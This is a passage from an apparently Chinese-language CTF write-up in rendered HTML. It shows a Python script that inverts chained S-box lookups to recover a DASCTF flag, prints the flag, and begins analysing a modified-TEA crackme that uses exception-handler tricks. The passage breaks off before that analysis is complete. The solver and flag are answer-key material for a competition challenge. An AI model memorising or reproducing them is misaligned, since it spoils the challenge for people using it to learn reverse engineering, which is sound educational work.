class="number">0x96</span>, <span class="number">0xB4</span>, <span class="number">0x6E</span>, <span class="number">0x63</span>, <span class="number">0xE3</span>,</span><br><span class="line">         <span class="number">0x34</span>, <span class="number">0x2D</span>, <span class="number">0xCE</span>, <span class="number">0x0A</span>, <span class="number">0xCD</span>, <span class="number">0xAA</span>, <span class="number">0x21</span>, <span class="number">0xCC</span>, <span class="number">0xE7</span>, <span class="number">0xA5</span>, <span class="number">0xDB</span>, <span class="number">0xD8</span>, <span class="number">0x03</span>, <span class="number">0xDD</span>, <span class="number">0xB2</span>, <span class="number">0x1F</span>, <span class="number">0x9D</span>, <span class="number">0x9E</span>,</span><br><span class="line">         <span class="number">0x0E</span>, <span class="number">0x8F</span>, <span class="number">0x8B</span>, <span class="number">0xCA</span>, <span class="number">0x92</span>, <span class="number">0x0B</span>, <span class="number">0xA7</span>, <span class="number">0x5B</span>, <span class="number">0xD2</span>, <span class="number">0xCF</span>, <span class="number">0x47</span>, <span class="number">0x07</span>, <span class="number">0x04</span>, <span class="number">0xAE</span>, <span class="number">0x3B</span>, <span class="number">0xA8</span>, <span class="number">0x7C</span>, <span class="number">0x73</span>,</span><br><span class="line">         <span class="number">0xF9</span>, <span class="number">0x35</span>, <span class="number">0xEE</span>, <span class="number">0x7A</span>, <span class="number">0xB0</span>, <span class="number">0xBA</span>, <span class="number">0x85</span>, <span class="number">0x46</span>, <span class="number">0x3E</span>, <span class="number">0x81</span>, <span class="number">0xC7</span>, <span class="number">0x40</span>, <span class="number">0x37</span>, <span class="number">0x15</span>, <span class="number">0x3A</span>, <span class="number">0x19</span>, <span class="number">0xE0</span>, <span class="number">0x1E</span>,</span><br><span class="line">         <span class="number">0x28</span>, <span class="number">0x4A</span>, <span class="number">0x4F</span>, <span class="number">0x8C</span>, <span class="number">0xD4</span>, <span class="number">0x51</span>, <span class="number">0x2E</span>, <span class="number">0x94</span>, <span class="number">0x89</span>, <span class="number">0x2A</span>, <span class="number">0x0F</span>, <span class="number">0x7E</span>, <span class="number">0xE1</span>, <span class="number">0xC8</span>, <span class="number">0x5F</span>, <span class="number">0x4E</span>, <span class="number">0x6D</span>, <span class="number">0xF6</span>,</span><br><span class="line">         <span class="number">0x49</span>, <span class="number">0xB8</span>, <span class="number">0x55</span>, <span class="number">0x60</span>, <span class="number">0x82</span>, <span class="number">0x20</span>, <span class="number">0x36</span>, <span class="number">0xC1</span>, <span class="number">0x0C</span>, <span class="number">0x1B</span>, <span class="number">0xC4</span>, <span class="number">0x00</span>, <span class="number">0xE5</span>, <span class="number">0xA3</span>, <span class="number">0x2C</span>, <span class="number">0xE9</span>, <span class="number">0xC2</span>, <span class="number">0xF1</span>,</span><br><span class="line">         <span class="number">0x23</span>, <span class="number">0x3F</span>, <span class="number">0xC3</span>, <span class="number">0xB5</span>, <span class="number">0x8D</span>, <span class="number">0xD7</span>, <span class="number">0x42</span>, <span class="number">0xFC</span>, <span class="number">0x50</span>, <span class="number">0x13</span>, <span class="number">0xBB</span>, <span class="number">0x61</span>, <span class="number">0x9A</span>, <span class="number">0x44</span>, <span class="number">0xE6</span>, <span class="number">0x91</span>, <span class="number">0x2F</span>, <span class="number">0x70</span>,</span><br><span class="line">         <span class="number">0xC6</span>, <span class="number">0x6F</span>, <span class="number">0xD1</span>, <span class="number">0x27</span>, <span class="number">0x43</span>, <span class="number">0x08</span>, <span class="number">0xDA</span>, <span class="number">0xFD</span>, <span class="number">0x52</span>, <span class="number">0x71</span>, <span class="number">0x77</span>, <span class="number">0xED</span>, <span class="number">0xE2</span>, <span class="number">0xAD</span>, <span class="number">0x16</span>, <span class="number">0x8E</span>, <span class="number">0x12</span>, <span class="number">0x4C</span>,</span><br><span class="line">         <span class="number">0x31</span>, <span class="number">0x3C</span>, <span class="number">0x39</span>, <span class="number">0x78</span>, <span class="number">0x90</span>, <span class="number">0xBF</span>, <span class="number">0x1A</span>, <span class="number">0x76</span>, <span class="number">0x75</span>, <span class="number">0x41</span>, <span class="number">0x99</span>, <span class="number">0xD0</span>, <span class="number">0x80</span>, <span class="number">0xB7</span>, <span class="number">0x66</span>, <span class="number">0x24</span>, <span class="number">0xD3</span>, <span class="number">0x7F</span>,</span><br><span class="line">         <span class="number">0x4B</span>, <span class="number">0x45</span>, <span class="number">0x5C</span>, <span class="number">0x53</span>, <span class="number">0x4D</span>, <span class="number">0x26</span>, <span class="number">0x32</span>, <span class="number">0xA0</span>, <span class="number">0xFB</span>, <span class="number">0xB3</span>, <span class="number">0x38</span>, <span class="number">0x6B</span>, <span class="number">0xAF</span>, <span class="number">0xA6</span>, <span class="number">0xD9</span>, <span class="number">0x02</span>, <span class="number">0xA4</span>, <span class="number">0xEA</span>,</span><br><span class="line">         <span class="number">0x6C</span>, <span class="number">0xAC</span>, <span class="number">0x58</span>, <span class="number">0x93</span>]</span><br><span class="line">box19 = [<span class="number">0x91</span>, <span class="number">0x67</span>, <span class="number">0x1A</span>, <span class="number">0xBE</span>, <span class="number">0xAB</span>, <span class="number">0xC2</span>, <span class="number">0x85</span>, <span class="number">0xD5</span>, <span class="number">0xDA</span>, <span class="number">0xCC</span>, <span class="number">0xF7</span>, <span class="number">0x5B</span>, <span class="number">0x54</span>, <span class="number">0x61</span>, <span class="number">0x05</span>, <span class="number">0xDF</span>, <span class="number">0x02</span>, <span class="number">0x70</span>,</span><br><span class="line">         <span class="number">0x65</span>, <span class="number">0x69</span>, <span class="number">0x9A</span>, <span class="number">0x7A</span>, <span class="number">0x09</span>, <span class="number">0x92</span>, <span class="number">0x5D</span>, <span class="number">0x2A</span>, <span class="number">0xA7</span>, <span class="number">0x37</span>, <span class="number">0xFF</span>, <span class="number">0x19</span>, <span class="number">0xE6</span>, <span class="number">0x99</span>, <span class="number">0xF3</span>, <span class="number">0x1E</span>, <span class="number">0xBD</span>, <span class="number">0x82</span>,</span><br><span class="line">         <span class="number">0x48</span>, <span class="number">0x3C</span>, <span class="number">0xE8</span>, <span class="number">0xC8</span>, <span class="number">0x66</span>, <span class="number">0x17</span>, <span class="number">0xB7</span>, <span class="number">0xA9</span>, <span class="number">0xC5</span>, <span class="number">0x4E</span>, <span class="number">0x33</span>, <span class="number">0x84</span>, <span class="number">0x45</span>, <span class="number">0xD3</span>, <span class="number">0x8B</span>, <span class="number">0x49</span>, <span class="number">0x50</span>, <span class="number">0x43</span>,</span><br><span class="line">         <span class="number">0x8F</span>, <span class="number">0xCD</span>, <span class="number">0x73</span>, <span class="number">0x29</span>, <span class="number">0x04</span>, <span class="number">0xDC</span>, <span class="number">0x01</span>, <span class="number">0x0C</span>, <span class="number">0xDD</span>, <span class="number">0x2E</span>, <span class="number">0xFB</span>, <span class="number">0x6E</span>, <span class="number">0x0F</span>, <span class="number">0x24</span>, <span class="number">0x57</span>, <span class="number">0xE9</span>, <span class="number">0xC9</span>, <span class="number">0x7D</span>,</span><br><span class="line">         <span class="number">0xB3</span>, <span class="number">0x40</span>, <span class="number">0x4B</span>, <span class="number">0x56</span>, <span class="number">0x6C</span>, <span class="number">0x68</span>, <span class="number">0xE2</span>, <span class="number">0x22</span>, <span class="number">0xF6</span>, <span class="number">0x80</span>, <span class="number">0xAA</span>, <span class="number">0x95</span>, <span class="number">0xD4</span>, <span class="number">0x97</span>, <span class="number">0x94</span>, <span class="number">0x21</span>, <span class="number">0x53</span>, <span class="number">0xD1</span>,</span><br><span class="line">         <span class="number">0xE3</span>, <span class="number">0x59</span>, <span class="number">0xD2</span>, <span class="number">0xED</span>, <span class="number">0x41</span>, <span class="number">0x4D</span>, <span class="number">0x74</span>, <span class="number">0xA3</span>, <span class="number">0xA0</span>, <span class="number">0x32</span>, <span class="number">0x0D</span>, <span class="number">0xFC</span>, <span class="number">0x46</span>, <span class="number">0x34</span>, <span class="number">0xFA</span>, <span class="number">0xB1</span>, <span class="number">0x5E</span>, <span class="number">0xC6</span>,</span><br><span class="line">         <span class="number">0x71</span>, <span class="number">0xC0</span>, <span class="number">0xE0</span>, <span class="number">0x3F</span>, <span class="number">0x13</span>, <span class="number">0x12</span>, <span class="number">0xD7</span>, <span class="number">0xEE</span>, <span class="number">0xF8</span>, <span class="number">0x26</span>, <span class="number">0xE1</span>, <span class="number">0x25</span>, <span class="number">0x88</span>, <span class="number">0x77</span>, <span class="number">0xB0</span>, <span class="number">0x8D</span>, <span class="number">0x6A</span>, <span class="number">0xEA</span>,</span><br><span class="line">         <span class="number">0x0E</span>, <span class="number">0xD6</span>, <span class="number">0x3E</span>, <span class="number">0x03</span>, <span class="number">0x64</span>, <span class="number">0xBF</span>, <span class="number">0x8C</span>, <span class="number">0x96</span>, <span class="number">0xD9</span>, <span class="number">0xA4</span>, <span class="number">0x42</span>, <span class="number">0xAD</span>, <span class="number">0xFD</span>, <span class="number">0x16</span>, <span class="number">0x5A</span>, <span class="number">0xE4</span>, <span class="number">0x06</span>, <span class="number">0x9D</span>,</span><br><span class="line">         <span class="number">0x07</span>, <span class="number">0x87</span>, <span class="number">0x5F</span>, <span class="number">0xAF</span>, <span class="number">0xDB</span>, <span class="number">0xC1</span>, <span class="number">0x93</span>, <span class="number">0x1C</span>, <span class="number">0xF1</span>, <span class="number">0xDE</span>, <span class="number">0xA6</span>, <span class="number">0x3A</span>, <span class="number">0xF4</span>, <span class="number">0x2C</span>, <span class="number">0x1B</span>, <span class="number">0x39</span>, <span class="number">0xE7</span>, <span class="number">0x4A</span>,</span><br><span class="line">         <span class="number">0xC7</span>, <span class="number">0x35</span>, <span class="number">0xFE</span>, <span class="number">0x0A</span>, <span class="number">0x62</span>, <span class="number">0xF0</span>, <span class="number">0xCA</span>, <span class="number">0xEC</span>, <span class="number">0x27</span>, <span class="number">0x52</span>, <span class="number">0x23</span>, <span class="number">0x7F</span>, <span class="number">0xA5</span>, <span class="number">0x79</span>, <span class="number">0x7C</span>, <span class="number">0x75</span>, <span class="number">0x86</span>, <span class="number">0xEB</span>,</span><br><span class="line">         <span class="number">0x60</span>, <span class="number">0xA8</span>, <span class="number">0xF5</span>, <span class="number">0x1F</span>, <span class="number">0x20</span>, <span class="number">0xC3</span>, <span class="number">0x63</span>, <span class="number">0x5C</span>, <span class="number">0x72</span>, <span class="number">0x18</span>, <span class="number">0xE5</span>, <span class="number">0x51</span>, <span class="number">0xAC</span>, <span class="number">0xB9</span>, <span class="number">0x90</span>, <span class="number">0x9F</span>, <span class="number">0x4C</span>, <span class="number">0xB2</span>,</span><br><span class="line">         <span class="number">0xCB</span>, <span class="number">0x00</span>, <span class="number">0x6F</span>, <span class="number">0x28</span>, <span class="number">0xA1</span>, <span class="number">0xB6</span>, <span class="number">0x9B</span>, <span class="number">0xD0</span>, <span class="number">0x7B</span>, <span class="number">0x36</span>, <span class="number">0x4F</span>, <span class="number">0x9C</span>, <span class="number">0xCF</span>, <span class="number">0x98</span>, <span class="number">0x8A</span>, <span class="number">0x0B</span>, <span class="number">0x78</span>, <span class="number">0xB4</span>,</span><br><span class="line">         <span class="number">0x7E</span>, <span class="number">0x2B</span>, <span class="number">0xEF</span>, <span class="number">0x58</span>, <span class="number">0xB5</span>, <span class="number">0xBA</span>, <span class="number">0x55</span>, <span class="number">0xB8</span>, <span class="number">0x10</span>, <span class="number">0x2F</span>, <span class="number">0x44</span>, <span class="number">0xAE</span>, <span class="number">0x89</span>, <span class="number">0x08</span>, <span class="number">0xC4</span>, <span class="number">0x3B</span>, <span class="number">0x9E</span>, <span class="number">0xF9</span>,</span><br><span class="line">         <span class="number">0x6D</span>, <span class="number">0xF2</span>, <span class="number">0x15</span>, <span class="number">0x1D</span>, <span class="number">0x30</span>, <span class="number">0x47</span>, <span class="number">0x8E</span>, <span class="number">0x31</span>, <span class="number">0x2D</span>, <span class="number">0xD8</span>, <span class="number">0x6B</span>, <span class="number">0x3D</span>, <span class="number">0x11</span>, <span class="number">0x14</span>, <span class="number">0xA2</span>, <span class="number">0x83</span>, <span class="number">0xCE</span>, <span class="number">0xBB</span>,</span><br><span class="line">         <span class="number">0x81</span>, <span class="number">0xBC</span>, <span class="number">0x76</span>, <span class="number">0x38</span>]</span><br><span class="line">box23 = [<span class="number">0x38</span>, <span class="number">0x5A</span>, <span class="number">0xC7</span>, <span class="number">0x98</span>, <span class="number">0x15</span>, <span class="number">0x6A</span>, <span class="number">0xC9</span>, <span class="number">0x28</span>, <span class="number">0x33</span>, <span class="number">0xEA</span>, <span class="number">0xF4</span>, <span class="number">0xD9</span>, <span class="number">0xDB</span>, <span class="number">0x77</span>, <span class="number">0xB8</span>, <span class="number">0x49</span>, <span class="number">0x1B</span>, <span class="number">0x79</span>,</span><br><span class="line">         <span class="number">0xF5</span>, <span class="number">0xFD</span>, <span class="number">0x3E</span>, <span class="number">0xA2</span>, <span class="number">0xDE</span>, <span class="number">0x17</span>, <span class="number">0xC4</span>, <span class="number">0x5E</span>, <span class="number">0xE5</span>, <span class="number">0x11</span>, <span class="number">0xB6</span>, <span class="number">0x1D</span>, <span class="number">0x86</span>, <span class="number">0xF9</span>, <span class="number">0x90</span>, <span class="number">0x78</span>, <span class="number">0x8A</span>, <span class="number">0x14</span>,</span><br><span class="line">         <span class="number">0x12</span>, <span class="number">0xB1</span>, <span class="number">0xC2</span>, <span class="number">0x21</span>, <span class="number">0xF1</span>, <span class="number">0x02</span>, <span class="number">0x58</span>, <span class="number">0xA1</span>, <span class="number">0x23</span>, <span class="number">0x0C</span>, <span class="number">0xAD</span>, <span class="number">0xA5</span>, <span class="number">0x50</span>, <span class="number">0x48</span>, <span class="number">0x1E</span>, <span class="number">0x6D</span>, <span class="number">0xF8</span>, <span class="number">0x96</span>,</span><br><span class="line">         <span class="number">0x9D</span>, <span class="number">0x19</span>, <span class="number">0x00</span>, <span class="number">0xBD</span>, <span class="number">0x26</span>, <span class="number">0xCE</span>, <span class="number">0xA7</span>, <span class="number">0x24</span>, <span class="number">0x2E</span>, <span class="number">0x39</span>, <span class="number">0x7B</span>, <span class="number">0xFA</span>, <span class="number">0x5F</span>, <span class="number">0xCC</span>, <span class="number">0x1A</span>, <span class="number">0x0B</span>, <span class="number">0x40</span>, <span class="number">0x0F</span>,</span><br><span class="line">         <span class="number">0x4B</span>, <span class="number">0x82</span>, <span class="number">0xE2</span>, <span class="number">0x97</span>, <span class="number">0x10</span>, <span class="number">0x2A</span>, <span class="number">0xFC</span>, <span class="number">0x3B</span>, <span class="number">0xB2</span>, <span class="number">0x66</span>, <span class="number">0x27</span>, <span class="number">0x54</span>, <span class="number">0x07</span>, <span class="number">0xE3</span>, <span class="number">0x08</span>, <span class="number">0xA3</span>, <span class="number">0xA6</span>, <span class="number">0xED</span>,</span><br><span class="line">         <span class="number">0x62</span>, <span class="number">0x13</span>, <span class="number">0x9C</span>, <span class="number">0x20</span>, <span class="number">0x01</span>, <span class="number">0x92</span>, <span class="number">0xE8</span>, <span class="number">0xAE</span>, <span class="number">0xBE</span>, <span class="number">0xE1</span>, <span class="number">0x0A</span>, <span class="number">0x41</span>, <span class="number">0x94</span>, <span class="number">0x80</span>, <span class="number">0xA9</span>, <span class="number">0x2F</span>, <span class="number">0x29</span>, <span class="number">0x70</span>,</span><br><span class="line">         <span class="number">0x35</span>, <span class="number">0x16</span>, <span class="number">0xF7</span>, <span class="number">0x6B</span>, <span class="number">0xFE</span>, <span class="number">0x9E</span>, <span class="number">0x0D</span>, <span class="number">0xD3</span>, <span class="number">0x7F</span>, <span class="number">0x1F</span>, <span class="number">0xA0</span>, <span class="number">0x32</span>, <span class="number">0xD2</span>, <span class="number">0x52</span>, <span class="number">0x05</span>, <span class="number">0x76</span>, <span class="number">0x89</span>, <span class="number">0x9B</span>,</span><br><span class="line">         <span class="number">0x7A</span>, <span class="number">0x8F</span>, <span class="number">0x99</span>, <span class="number">0xEF</span>, <span class="number">0xCF</span>, <span class="number">0x51</span>, <span class="number">0x0E</span>, <span class="number">0xEC</span>, <span class="number">0x59</span>, <span class="number">0x5C</span>, <span class="number">0x37</span>, <span class="number">0xD5</span>, <span class="number">0x8E</span>, <span class="number">0x31</span>, <span class="number">0x34</span>, <span class="number">0x2D</span>, <span class="number">0x93</span>, <span class="number">0x25</span>,</span><br><span class="line">         <span class="number">0x1C</span>, <span class="number">0xC8</span>, <span class="number">0x5B</span>, <span class="number">0x47</span>, <span class="number">0x9F</span>, <span class="number">0x03</span>, <span class="number">0x67</span>, <span class="number">0x7E</span>, <span class="number">0x42</span>, <span class="number">0x7D</span>, <span class="number">0x3A</span>, <span class="number">0xAA</span>, <span class="number">0x57</span>, <span class="number">0xDA</span>, <span class="number">0x9A</span>, <span class="number">0xAB</span>, <span class="number">0x74</span>, <span class="number">0x72</span>,</span><br><span class="line">         <span class="number">0xE4</span>, <span class="number">0xB7</span>, <span class="number">0x5D</span>, <span class="number">0xCD</span>, <span class="number">0x87</span>, <span class="number">0x46</span>, <span class="number">0x2B</span>, <span class="number">0x43</span>, <span class="number">0xF3</span>, <span class="number">0xD0</span>, <span class="number">0x85</span>, <span class="number">0x55</span>, <span class="number">0xBB</span>, <span class="number">0xD4</span>, <span class="number">0xC6</span>, <span class="number">0x61</span>, <span class="number">0x56</span>, <span class="number">0x04</span>,</span><br><span class="line">         <span class="number">0x65</span>, <span class="number">0x7C</span>, <span class="number">0x88</span>, <span class="number">0xC3</span>, <span class="number">0x73</span>, <span class="number">0xBC</span>, <span class="number">0xEB</span>, <span class="number">0xDD</span>, <span class="number">0x4D</span>, <span class="number">0xE0</span>, <span class="number">0xE6</span>, <span class="number">0xC0</span>, <span class="number">0x63</span>, <span class="number">0x8D</span>, <span class="number">0xF2</span>, <span class="number">0x81</span>, <span class="number">0xF6</span>, <span class="number">0xA8</span>,</span><br><span class="line">         <span class="number">0x3D</span>, <span class="number">0x3F</span>, <span class="number">0xA4</span>, <span class="number">0xE9</span>, <span class="number">0x4A</span>, <span class="number">0xB5</span>, <span class="number">0xF0</span>, <span class="number">0xCA</span>, <span class="number">0x8B</span>, <span class="number">0x2C</span>, <span class="number">0xD7</span>, <span class="number">0xAC</span>, <span class="number">0xC5</span>, <span class="number">0xC1</span>, <span class="number">0xBF</span>, <span class="number">0x53</span>, <span class="number">0xD1</span>, <span class="number">0x6F</span>,</span><br><span class="line">         <span class="number">0x06</span>, <span class="number">0xE7</span>, <span class="number">0xD6</span>, <span class="number">0x09</span>, <span class="number">0x95</span>, <span class="number">0x44</span>, <span class="number">0x71</span>, <span class="number">0xB9</span>, <span class="number">0x83</span>, <span class="number">0x4C</span>, <span class="number">0x22</span>, <span class="number">0xAF</span>, <span class="number">0xB4</span>, <span class="number">0x75</span>, <span class="number">0x36</span>, <span class="number">0x30</span>, <span class="number">0xCB</span>, <span class="number">0xEE</span>,</span><br><span class="line">         <span class="number">0x91</span>, <span class="number">0x45</span>, <span class="number">0x8C</span>, <span class="number">0x4E</span>, <span class="number">0x6E</span>, <span class="number">0x6C</span>, <span class="number">0x4F</span>, <span class="number">0x84</span>, <span class="number">0xBA</span>, <span class="number">0xFF</span>, <span class="number">0x64</span>, <span class="number">0xB3</span>, <span class="number">0x60</span>, <span class="number">0xFB</span>, <span class="number">0xB0</span>, <span class="number">0x18</span>, <span class="number">0xD8</span>, <span class="number">0xDF</span>,</span><br><span class="line">         <span class="number">0x3C</span>, <span class="number">0x68</span>, <span class="number">0xDC</span>, <span class="number">0x69</span>]</span><br><span class="line">box29 = [<span class="number">0xD1</span>, <span class="number">0x9C</span>, <span class="number">0x68</span>, <span class="number">0xC0</span>, <span class="number">0x13</span>, <span class="number">0xAC</span>, <span class="number">0x48</span>, <span class="number">0x32</span>, <span class="number">0xA3</span>, <span class="number">0xBA</span>, <span class="number">0x4C</span>, <span class="number">0xE7</span>, <span class="number">0x6D</span>, <span class="number">0xC8</span>, <span class="number">0x1C</span>, <span class="number">0xAB</span>, <span class="number">0xE2</span>, <span class="number">0x7A</span>,</span><br><span class="line">         <span class="number">0x42</span>, <span class="number">0xE1</span>, <span class="number">0x7B</span>, <span class="number">0x16</span>, <span class="number">0x67</span>, <span class="number">0x03</span>, <span class="number">0xAE</span>, <span class="number">0x7E</span>, <span class="number">0xAA</span>, <span class="number">0x38</span>, <span class="number">0x22</span>, <span class="number">0x02</span>, <span class="number">0x39</span>, <span class="number">0x51</span>, <span class="number">0xC7</span>, <span class="number">0x79</span>, <span class="number">0xD7</span>, <span class="number">0xCB</span>,</span><br><span class="line">         <span class="number">0xEF</span>, <span class="number">0x62</span>, <span class="number">0x98</span>, <span class="number">0xDC</span>, <span class="number">0x53</span>, <span class="number">0x72</span>, <span class="number">0x89</span>, <span class="number">0xA5</span>, <span class="number">0x4B</span>, <span class="number">0xC6</span>, <span class="number">0x86</span>, <span class="number">0xF6</span>, <span class="number">0xFC</span>, <span class="number">0x77</span>, <span class="number">0x5A</span>, <span class="number">0xF5</span>, <span class="number">0x2E</span>, <span class="number">0x3D</span>,</span><br><span class="line">         <span class="number">0xB2</span>, <span class="number">0xFE</span>, <span class="number">0x59</span>, <span class="number">0x27</span>, <span class="number">0x80</span>, <span class="number">0x63</span>, <span class="number">0xDD</span>, <span class="number">0x1A</span>, <span class="number">0x12</span>, <span class="number">0x5E</span>, <span class="number">0xED</span>, <span class="number">0xB0</span>, <span class="number">0xBC</span>, <span class="number">0xC4</span>, <span class="number">0x5F</span>, <span class="number">0x11</span>, <span class="number">0xC9</span>, <span class="number">0x09</span>,</span><br><span class="line">         <span class="number">0xC5</span>, <span class="number">0x75</span>, <span class="number">0x96</span>, <span class="number">0x0A</span>, <span class="number">0x2F</span>, <span class="number">0x00</span>, <span class="number">0x17</span>, <span class="number">0x81</span>, <span class="number">0x14</span>, <span class="number">0x47</span>, <span class="number">0xBB</span>, <span class="number">0x9D</span>, <span class="number">0x8E</span>, <span class="number">0x3C</span>, <span class="number">0xD6</span>, <span class="number">0xA1</span>, <span class="number">0xE0</span>, <span class="number">0xA2</span>,</span><br><span class="line">         <span class="number">0x26</span>, <span class="number">0x5D</span>, <span class="number">0x08</span>, <span class="number">0x6E</span>, <span class="number">0x4E</span>, <span class="number">0xF1</span>, <span class="number">0xCF</span>, <span class="number">0x73</span>, <span class="number">0x8A</span>, <span class="number">0x90</span>, <span class="number">0x0B</span>, <span class="number">0xB3</span>, <span class="number">0x3E</span>, <span class="number">0xB6</span>, <span class="number">0x1F</span>, <span class="number">0xC3</span>, <span class="number">0xB7</span>, <span class="number">0xDA</span>,</span><br><span class="line">         <span class="number">0x8D</span>, <span class="number">0x05</span>, <span class="number">0xEE</span>, <span class="number">0x18</span>, <span class="number">0x93</span>, <span class="number">0x3A</span>, <span class="number">0x6A</span>, <span class="number">0x8C</span>, <span class="number">0x43</span>, <span class="number">0x8F</span>, <span class="number">0xEB</span>, <span class="number">0xE9</span>, <span class="number">0x5B</span>, <span class="number">0x29</span>, <span class="number">0x37</span>, <span class="number">0x1E</span>, <span class="number">0x46</span>, <span class="number">0x33</span>,</span><br><span class="line">         <span class="number">0x31</span>, <span class="number">0xFB</span>, <span class="number">0x35</span>, <span class="number">0x34</span>, <span class="number">0x61</span>, <span class="number">0x04</span>, <span class="number">0x0E</span>, <span class="number">0x2B</span>, <span class="number">0x74</span>, <span class="number">0xF9</span>, <span class="number">0x8B</span>, <span class="number">0x2C</span>, <span class="number">0x20</span>, <span class="number">0x0C</span>, <span class="number">0x7C</span>, <span class="number">0x28</span>, <span class="number">0x5C</span>, <span class="number">0xCA</span>,</span><br><span class="line">         <span class="number">0xE6</span>, <span class="number">0x6B</span>, <span class="number">0xD8</span>, <span class="number">0x30</span>, <span class="number">0xE4</span>, <span class="number">0x21</span>, <span class="number">0x44</span>, <span class="number">0x70</span>, <span class="number">0x06</span>, <span class="number">0xA6</span>, <span class="number">0x60</span>, <span class="number">0x41</span>, <span class="number">0x84</span>, <span class="number">0x10</span>, <span class="number">0x95</span>, <span class="number">0x4F</span>, <span class="number">0x64</span>, <span class="number">0x83</span>,</span><br><span class="line">         <span class="number">0xD2</span>, <span class="number">0x9A</span>, <span class="number">0xBE</span>, <span class="number">0xAF</span>, <span class="number">0x9F</span>, <span class="number">0x07</span>, <span class="number">0xC1</span>, <span class="number">0xB8</span>, <span class="number">0x3B</span>, <span class="number">0x65</span>, <span class="number">0xCC</span>, <span class="number">0x57</span>, <span class="number">0xB5</span>, <span class="number">0xD9</span>, <span class="number">0x92</span>, <span class="number">0xDE</span>, <span class="number">0x0D</span>, <span class="number">0xE3</span>,</span><br><span class="line">         <span class="number">0xF3</span>, <span class="number">0xA4</span>, <span class="number">0xBD</span>, <span class="number">0x6F</span>, <span class="number">0xD3</span>, <span class="number">0x25</span>, <span class="number">0x88</span>, <span class="number">0x71</span>, <span class="number">0xFF</span>, <span class="number">0xA9</span>, <span class="number">0x36</span>, <span class="number">0xB1</span>, <span class="number">0x78</span>, <span class="number">0x24</span>, <span class="number">0x69</span>, <span class="number">0xAD</span>, <span class="number">0x19</span>, <span class="number">0xBF</span>,</span><br><span class="line">         <span class="number">0xFD</span>, <span class="number">0xCD</span>, <span class="number">0x4A</span>, <span class="number">0xEA</span>, <span class="number">0x87</span>, <span class="number">0x91</span>, <span class="number">0xA8</span>, <span class="number">0x66</span>, <span class="number">0x82</span>, <span class="number">0x50</span>, <span class="number">0x0F</span>, <span class="number">0x99</span>, <span class="number">0x45</span>, <span class="number">0xF2</span>, <span class="number">0xD5</span>, <span class="number">0x9B</span>, <span class="number">0x94</span>, <span class="number">0x7D</span>,</span><br><span class="line">         <span class="number">0xCE</span>, <span class="number">0xDB</span>, <span class="number">0xB9</span>, <span class="number">0x52</span>, <span class="number">0xE5</span>, <span class="number">0xF4</span>, <span class="number">0x01</span>, <span class="number">0x7F</span>, <span class="number">0xD4</span>, <span class="number">0x15</span>, <span class="number">0x2D</span>, <span class="number">0x3F</span>, <span class="number">0x1D</span>, <span class="number">0xA7</span>, <span class="number">0xC2</span>, <span class="number">0xFA</span>, <span class="number">0x40</span>, <span class="number">0xE8</span>,</span><br><span class="line">         <span class="number">0xA0</span>, <span class="number">0x55</span>, <span class="number">0x6C</span>, <span class="number">0xF7</span>, <span class="number">0x1B</span>, <span class="number">0x58</span>, <span class="number">0x85</span>, <span class="number">0x56</span>, <span class="number">0x9E</span>, <span class="number">0xEC</span>, <span class="number">0x97</span>, <span class="number">0x23</span>, <span class="number">0xF0</span>, <span class="number">0x4D</span>, <span class="number">0xD0</span>, <span class="number">0xF8</span>, <span class="number">0x2A</span>, <span class="number">0x49</span>,</span><br><span class="line">         <span class="number">0xB4</span>, <span class="number">0x76</span>, <span class="number">0x54</span>, <span class="number">0xDF</span>]</span><br><span class="line"></span><br><span class="line">key = [ <span class="number">90</span>, <span class="number">45</span>,  <span class="number">1</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">42</span>, <span class="number">186</span>, <span class="number">51</span>, <span class="number">72</span>, <span class="number">179</span>, <span class="number">186</span>, <span class="number">51</span>, <span class="number">113</span>, <span class="number">43</span>, <span class="number">114</span>, <span class="number">72</span>,</span><br><span class="line">       <span class="number">186</span>, <span class="number">42</span>, <span class="number">51</span>, <span class="number">45</span>, <span class="number">71</span>, <span class="number">51</span>, <span class="number">42</span>, <span class="number">186</span>, <span class="number">25</span>, <span class="number">186</span>, <span class="number">42</span>, <span class="number">114</span>, <span class="number">11</span>, <span class="number">124</span>, <span class="number">209</span>, <span class="number">51</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    x = box2.index(box3.index(</span><br><span class="line">        box5.index(box7.index(box11.index(box13.index(box17.index(box19.index(box23.index(box29.index(key[i]))))))))))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(x &amp; <span class="number">0xff</span>), end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></div></figure><p>记得补上之前smc异或的两个</p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DASCTF&#123;!y0u_4r3_7h3_m4573r_0f_r3v3r51n6_#&#125;</span><br></pre></td></tr></table></div></figure>        <h2 id="babytea"   >          <a href="#babytea" class="heading-link"><i class="fas fa-link"></i></a><a href="#babytea" class="headerlink" title="babytea"></a>babytea</h2>      <p>32位无壳，ida打开</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132212448.png" alt="image-20221127202337794"></p><p>32位输入，然后加密，最后比较</p><p>打开加密函数</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132212804.png" alt="image-20221127202519318"></p><p>很明显是tea加密，但估计没那么简单。</p><p>tea魔改主要在于修改delta以及对输入输出附加额外的加密</p><p>以防万一检查汇编</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132212660.png" alt="image-20230112174827683"></p><p>发现有try-except异常处理。这道题总共有三个</p><p>第一个是对sum进行修改</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132212935.png" alt="image-20221127203012268"></p><p>内存中的delta恒为<code>0x0x9E3779B1</code>,。</p><p>每次循环sum +&#x3D; delta之后进入try块，<code>ecx = sum &gt;&gt; 31</code></p><p>若ecx &#x3D; 0，idiv ecx 则会引发除零异常，进入except</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132213404.png" alt="image-20221127203346422"></p><p>在except中, <code>sum ^= 0x1234567</code>，在逆向中我我们需要每一轮sum和delta的值，于是写脚本进行计算</p><figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 